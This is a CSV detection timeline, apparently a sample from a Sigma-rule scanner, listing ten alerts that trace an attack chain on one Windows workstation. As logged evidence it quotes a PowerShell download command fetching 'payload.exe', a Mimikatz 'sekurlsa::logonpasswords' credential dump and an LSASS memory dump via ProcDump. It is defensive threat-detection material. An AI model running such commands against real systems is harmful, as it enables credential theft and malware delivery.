Timestamp,RuleTitle,Level,Computer,Channel,EventID,RecordID,Details,MitreTactics,MitreTags,OtherTags,RuleFile,EvtxFile
2024-01-15 08:45:12.123456 +00:00,PowerShell Encoded Command,high,WORKSTATION-01,Microsoft-Windows-PowerShell/Operational,4104,5001,"EncodedCommand: JABzACAAPQAgACcASABlAGwAbABvACcA",execution,T1059.001,powershell,proc_creation_win_powershell_encode.yml,Security.evtx
2024-01-15 08:47:33.456789 +00:00,Sysmon - CreateRemoteThread,high,WORKSTATION-01,Microsoft-Windows-Sysmon/Operational,8,5002,SourceImage: C:\Windows\explorer.exe TargetImage: C:\Windows\lsass.exe,defense-evasion,T1055,sysmon,sysmon_create_remote_thread.yml,Security.evtx
2024-01-15 09:01:00.000000 +00:00,Security Audit Log Cleared,medium,WORKSTATION-01,Security,1102,5003,SubjectUserName: ADMIN,defense-evasion,T1070.001,,win_security_event_log_cleared.yml,Security.evtx
2024-01-15 09:05:44.789012 +00:00,Suspicious Scheduled Task Created,medium,WORKSTATION-01,Security,4698,5004,TaskName: \Microsoft\Windows\Update,persistence,T1053.005,,win_security_new_scheduled_task.yml,Security.evtx
2024-01-15 09:10:15.234567 +00:00,LSASS Memory Dump via ProcDump,critical,WORKSTATION-01,Microsoft-Windows-Sysmon/Operational,10,5005,SourceImage: C:\Tools\procdump.exe TargetImage: C:\Windows\system32\lsass.exe,credential-access,T1003.001,,sysmon_lsass_memdump_handle_access.yml,Security.evtx
2024-01-15 09:12:30.111222 +00:00,Net User Account Discovery,low,WORKSTATION-01,Security,4798,5006,TargetUserName: Administrator,discovery,T1087.001,,win_security_net_user_recon.yml,Security.evtx
2024-01-15 09:15:00.333444 +00:00,PsExec Tool Execution,high,WORKSTATION-01,Security,4688,5007,NewProcessName: C:\Windows\PSEXESVC.exe,lateral-movement,T1569.002,,win_security_psexec_execution.yml,Security.evtx
2024-01-15 09:20:12.555666 +00:00,PowerShell Download Cradle,high,WORKSTATION-01,Microsoft-Windows-PowerShell/Operational,4104,5008,"Invoke-WebRequest -Uri http://192.168.1.100/payload.exe",command-and-control execution,T1059.001 T1105,,proc_creation_win_powershell_download.yml,Security.evtx
2024-01-15 09:25:44.777888 +00:00,WMI Spawning Child Process,medium,WORKSTATION-01,Microsoft-Windows-Sysmon/Operational,1,5009,ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe Image: C:\Windows\System32\cmd.exe,execution,T1047,,sysmon_wmi_spawning_process.yml,Security.evtx
2024-01-15 09:30:00.999000 +00:00,Mimikatz Command Line Options,critical,WORKSTATION-01,Microsoft-Windows-Sysmon/Operational,1,5010,CommandLine: sekurlsa::logonpasswords,credential-access,T1003.001,,sysmon_mimikatz_command_line.yml,Security.evtx
